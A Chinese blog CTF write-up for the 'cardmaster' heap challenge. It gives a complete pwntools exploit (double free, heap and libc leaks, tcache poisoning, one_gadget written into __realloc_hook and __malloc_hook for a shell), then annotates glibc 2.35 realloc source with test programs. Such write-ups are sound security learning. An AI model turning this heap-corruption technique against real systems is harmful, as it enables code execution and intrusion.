<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="cardmaster赛时wp超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉不过说实话这题就是纯靠动调猜出来的主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了  主要的时间卡在了泄露libc">
<meta property="og:type" content="article">
<meta property="og:title" content="网鼎杯半决赛">
<meta property="og:url" content="http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/index.html">
<meta property="og:site_name" content="C12en">
<meta property="og:description" content="cardmaster赛时wp超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉不过说实话这题就是纯靠动调猜出来的主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了  主要的时间卡在了泄露libc">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png">
<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202412202230980.png">
<meta property="article:published_time" content="2024-11-23T07:36:04.000Z">
<meta property="article:modified_time" content="2024-12-20T14:30:24.000Z">
<meta property="article:author" content="C12en">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png">
    
    
      
        
          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
        
      
      
        
          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
        
      
    
    <!-- title -->
    <title>网鼎杯半决赛</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/12/20/s8%E5%BC%BA%E7%BD%91%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/11/19/house-of-some/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&text=网鼎杯半决赛"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&is_video=false&description=网鼎杯半决赛"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=网鼎杯半决赛&body=Check out this article: http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&name=网鼎杯半决赛&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&t=网鼎杯半决赛"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cardmaster"><span class="toc-number">1.</span> <span class="toc-text">cardmaster</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E6%97%B6wp"><span class="toc-number">1.1.</span> <span class="toc-text">赛时wp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-realloc%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">后记 realloc详解</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        网鼎杯半决赛
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">C12en</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-23T07:36:04.000Z" class="dt-published" itemprop="datePublished">2024-11-23</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/wp/">wp</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="cardmaster"><a href="#cardmaster" class="headerlink" title="cardmaster"></a>cardmaster</h1><h2 id="赛时wp"><a href="#赛时wp" class="headerlink" title="赛时wp"></a>赛时wp</h2><p>超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉<br>不过说实话这题就是纯靠动调猜出来的<br>主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了  主要的时间卡在了泄露libc这一步<br>拿到libc地址后 就是想办法覆盖输出函数指针了  但是试了很久都没找到办法像刚才一样来构造double free 最后试了出来 利用realloc来把0x30的chunk放到tcachebin中 然后调用初始化函数就可以申请出来两个0x30的chunk  然后edit的时候 就可以进入malloc那个分之  就能把0x30的chunk申请出来了 而且这个chunk还是可以自定义地址的 然后就是打malloc_hook了  三个ogg的条件正常都没有办法实现 这里用realloc和malloc相结合的办法可以打通</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line">#io = remote(&quot;83.43.93.13&quot;,15000)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def init_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">def edit_card(count,number,level,payload):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line">    io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">    io.sendline(str(number))</span><br><span class="line">    io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">    io.sendline(str(level))</span><br><span class="line">    io.recvuntil(&quot;new suite set:&quot;)</span><br><span class="line">    io.send(payload)</span><br><span class="line">def shuffle_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">def show_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line">def get_info():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)</span><br><span class="line">edit_card(0,1,100,&quot;2\n&quot;)</span><br><span class="line">io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">io.sendline(str(0))</span><br><span class="line">io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">io.sendline(str(1))</span><br><span class="line">io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">io.sendline(str(100))</span><br><span class="line">io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;2&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)</span><br><span class="line">io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">io.sendline(str(0))</span><br><span class="line">io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">io.sendline(str(1))</span><br><span class="line">io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">io.sendline(str(100))</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_info()</span><br><span class="line">io.recvuntil(&quot;suit chara set:&quot;)</span><br><span class="line">heap_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">success(&quot;heap_addr :&quot;+hex(heap_addr))</span><br><span class="line">edit_card(300,0,100,&quot;\xa0&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">edit_card(11,0,100,&quot;\xa0&quot;)</span><br><span class="line"># pause()</span><br><span class="line">edit_card(11,0,100,p64(heap_addr-0x3c8))</span><br><span class="line">edit_card(1,1,100,&quot;\xa0&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)</span><br><span class="line">edit_card(1,1,100,&quot;a&quot;)</span><br><span class="line"># pause()</span><br><span class="line">init_card()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)</span><br><span class="line">edit_card(2,0,100,p64(heap_addr-0x640+0xa30))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xB10)&#x27;)</span><br><span class="line">get_info()</span><br><span class="line">io.recvuntil(&quot;suit chara set:&quot;)</span><br><span class="line">libc_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x3ebca0</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line"># # pause()</span><br><span class="line"></span><br><span class="line">edit_card(8,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(12,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(1,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(8,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(1,0,100,&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">realloc_hook = libc_addr + libc.sym[&#x27;__realloc_hook&#x27;]</span><br><span class="line">onegadget_addr = libc_addr + 0x10a38c</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">edit_card(8,0,100,p64(realloc_hook-0x10))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)</span><br><span class="line">init_card()</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">realloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]</span><br><span class="line">edit_card(8,0,100,p64(0)*2+p64(onegadget_addr)+p64(realloc_addr+0x6))</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)</span><br><span class="line">init_card()</span><br><span class="line"># pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="后记-realloc详解"><a href="#后记-realloc详解" class="headerlink" title="后记 realloc详解"></a>后记 realloc详解</h2><p>专门研究了一下realloc 发现还有平时不知道的很多用法<br>realloc函数主要用于重新分配内存空间 可以调整已分配的内存空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *realloc(void *ptr, size_t size)</span><br></pre></td></tr></table></figure>
<p>ptr指向需要重分配的chunk指针  size表示的需要分配的大小<br>来看看正常情况下的realloc如何运作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//gcc -o test -g ./test.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 0, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    char *ptr = malloc(0x30);</span><br><span class="line">    realloc(ptr,0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行realloc之前的ptr如下图所示<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png" alt="image.png"></a><br>执行之后 原先的chunk就重新分配成了0x20 剩下的0x20被释放进入bin中<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png" alt="image.png"></a><br>这里注意的是 虽然重分配的大小是0x10 按理来说0x30的chunk分配掉0x10 那剩余的实际大小应该是0x20 但是最终两个chunk的实际大小都是0x10 是为了考虑到不破坏原有的堆结构<br>此时如果把realloc函数的ptr参数修改为0 来看看会是什么效果<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png" alt="image.png"></a><br>由于没有需要重分配的chunk 所以这里直接申请了一个新的chunk<br>如果把realloc函数的size参数修改为0<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png" alt="image.png"></a><br>则会直接把chunk释放进入bin中<br>如果size的大小大于chunk原本的大小呢<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png" alt="image.png"></a><br>则会直接扩大chunk的size<br>如果chunk1后面再跟一个chunk2来固定大小呢 这个时候chunk1没法直接向高地址扩大<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png" alt="image.png"></a><br>可以看到取而代之的办法就是直接释放chunk1 然后重新申请一个满足size的chunk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//gcc -o test -g ./test.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 0, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    char *ptr = malloc(0x30);</span><br><span class="line">    char *ptr1 = malloc(0x30);</span><br><span class="line">    char *ptr2 = malloc(0x10);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    realloc(ptr,0x30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里猜测realloc重分配的逻辑是先释放再申请 这里先释放一个0x30大小的chunk 再进行realloc 看看重新分配后的指针是指向哪一个chunk<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png" alt="image.png"></a><br>依然指向的是chunk0<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png" alt="image.png"></a><br>和设想的有点不一样 这里去查看下realloc的注释<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png" alt="image.png"></a><br>按照源码所说 当重分配的size大于原有的size时 会采用malloc-copy-free的操作序列 也就是先申请满足大小的chunk 再转移数据 最后释放原来的chunk<br>但是上面我们已经实验过 当tcachebin中存在满足大小的chunk时 他也不会去申请<br>哪怕把tcachebin换成unsortedbin也是同理<br>那还是得根据realloc的源代码来查看一下详细的逻辑<br>(以下源码版本为glibc2.35 中文注释为我所记)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *</span><br><span class="line">__libc_realloc (void *oldmem, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         /* padded request size */</span><br><span class="line"></span><br><span class="line">  void *newp;             /* chunk to return */</span><br><span class="line"></span><br><span class="line">  if (!__malloc_initialized)   //检测堆是否初始化</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"></span><br><span class="line">#if REALLOC_ZERO_BYTES_FREES  //这个的值默认为1 当bytes为0且指针不为空时 realloc相当于free函数</span><br><span class="line">  if (bytes == 0 &amp;&amp; oldmem != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); return 0;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /* realloc of null is supposed to be same as malloc */</span><br><span class="line">  if (oldmem == 0)   //当指针为空时 realloc相当于malloc函数</span><br><span class="line">    return __libc_malloc (bytes);</span><br><span class="line"></span><br><span class="line">  /* Perform a quick check to ensure that the pointer&#x27;s tag matches the</span><br><span class="line">     memory&#x27;s tag.  */</span><br><span class="line">  if (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(volatile char*) oldmem;</span><br><span class="line"></span><br><span class="line">  /* chunk corresponding to oldmem */   //获取内存块指针以及内存块大小</span><br><span class="line">  const mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  /* its size */</span><br><span class="line">  const INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))  //检测是否通过mmap方式分配的内存  malloc函数申请的内存空间是由brk得到的</span><br><span class="line">    ar_ptr = NULL;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line">      ar_ptr = arena_for_chunk (oldp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* Little security check which won&#x27;t hurt performance: the allocator</span><br><span class="line">     never wrapps around at the end of the address space.  Therefore</span><br><span class="line">     we can exclude some size values which might appear here by</span><br><span class="line">     accident or by &quot;design&quot; from some intruder.  */</span><br><span class="line">  if ((__builtin_expect ((uintptr_t) oldp &gt; (uintptr_t) -oldsize, 0)   //检查内存块大小是否小于零以及指针是否对齐</span><br><span class="line">       || __builtin_expect (misaligned_chunk (oldp), 0)))</span><br><span class="line">      malloc_printerr (&quot;realloc(): invalid pointer&quot;);</span><br><span class="line"></span><br><span class="line">  if (!checked_request2size (bytes, &amp;nb))   //检查申请的bytes大小</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))</span><br><span class="line">    &#123;</span><br><span class="line">      void *newmem;</span><br><span class="line"></span><br><span class="line">#if HAVE_MREMAP  //默认为0 作用是为1时让realloc使用mremap来重分配大chunk</span><br><span class="line">      newp = mremap_chunk (oldp, nb);</span><br><span class="line">      if (newp)</span><br><span class="line">    &#123;</span><br><span class="line">      void *newmem = chunk2mem_tag (newp);</span><br><span class="line">      /* Give the new block a different tag.  This helps to ensure</span><br><span class="line">         that stale handles to the previous mapping are not</span><br><span class="line">         reused.  There&#x27;s a performance hit for both us and the</span><br><span class="line">         caller for doing this, so we might want to</span><br><span class="line">         reconsider.  */</span><br><span class="line">      return tag_new_usable (newmem);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line">      /* Note the extra SIZE_SZ overhead. */</span><br><span class="line">      if (oldsize - SIZE_SZ &gt;= nb)   //SIZE_SZ表示chunk的元数据 如果chunk大小大于bytes 就直接返回chunk指针</span><br><span class="line">        return oldmem;                         /* do nothing */</span><br><span class="line"></span><br><span class="line">      /* Must alloc, copy, free. */</span><br><span class="line">      newmem = __libc_malloc (bytes); //这里就是比较关键的逻辑了 如果原有的chunk空间不够重分配 那么就调用malloc(bytes) 然后把旧chunk的内容copy到新chunk</span><br><span class="line">      if (newmem == 0)</span><br><span class="line">        return 0;              /* propagate failure */</span><br><span class="line"></span><br><span class="line">      memcpy (newmem, oldmem, oldsize - CHUNK_HDR_SZ);</span><br><span class="line">      munmap_chunk (oldp);  //释放旧chunk</span><br><span class="line">      return newmem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (SINGLE_THREAD_P)  //单线程情况下的重分配</span><br><span class="line">    &#123;</span><br><span class="line">      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line">      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">      return newp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  //多线程</span><br><span class="line">  __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line">  </span><br><span class="line">  //内存分配失败时的异常处理</span><br><span class="line">  if (newp == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try harder to allocate memory in other arenas.  */</span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      if (newp != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">      size_t sz = memsize (oldp);</span><br><span class="line">      memcpy (newp, oldmem, sz);</span><br><span class="line">      (void) tag_region (chunk2mem (oldp), sz);</span><br><span class="line">          _int_free (ar_ptr, oldp, 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  return newp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点关注的部分就是malloc-copy-free这个流程了 当oldp的size不满足bytes的时候 就会触发 但是我们之前的实验却没有成功 不过因为libc_realloc函数中的mcf流程只存在于if (chunk_is_mmapped (oldp))这个分支中 需要chunk由mmap分配的才行 所以接下来需要接着分析int_realloc函数</p>
